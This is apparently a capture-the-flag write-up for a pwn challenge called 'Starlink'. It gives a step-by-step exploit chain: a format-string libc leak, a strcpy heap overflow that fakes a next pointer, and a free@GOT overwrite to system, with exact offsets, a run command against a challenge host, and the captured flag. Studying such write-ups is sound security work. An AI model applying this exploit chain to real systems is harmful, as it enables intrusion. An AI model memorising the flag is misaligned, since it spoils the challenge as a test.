# Starlink

**Point: 56**

Humanity engineered this system piece by piece, launching thousands of mass produced nodes until the sky was more wire than void. To solve this issue, they developed an autonomous system that can rid the sky of them automatically when there are too many nodes.

The system rids the sky of nodes by physically colliding with them, but a glitch causes a chain reaction. Instead of cleaning, it creates a 'Kessler Syndrome' event a cloud of supersonic shrapnel that traps humanity on Earth.

Can you stop this rogue system and free humanity from this lethal cage?

## Vulnerability Summary

- Startup format string leak: `%29$p` gives libc leak (`__libc_start_main+0x8b`).
- Heap overflow in `Update`: `strcpy(node->content, input)` lets us overwrite `next`.
- Partial RELRO: writable GOT, so `free@GOT` can be replaced.

## Minimal Exploit Flow

1. Leak libc with `%29$p`.
2. Compute `libc_base = leak - 0x2a28b`, then resolve `system`.
3. Create one node with name as command, e.g. `cat flag*;cat /flag*`.
4. Overflow with `b"A"*0x107 + p64(0x403fe7)` to set fake `next`.
5. Update using empty name `""` with `p64(system)` to overwrite `free@GOT`, then delete the command node to trigger `system(name)`.

## Key Constants

- `free@GOT = 0x404000`
- `fake_node = 0x403fe7` (`fake_node + 0x19 = free@GOT`)
- `overflow offset to next = 0x107`
- `libc leak offset = 0x2a28b`

```bash
python exploit.py HOST=194.102.62.175 PORT=21434
```

# Flag:

`UVT{wh444t_h0us3_0f_sp1r1t_1n_th3_b1g_2026_ph4nt4sm4l_ph4nt4smagor14_1s_1t_y0u_06112009_JSdlsadasd8348Gh}`
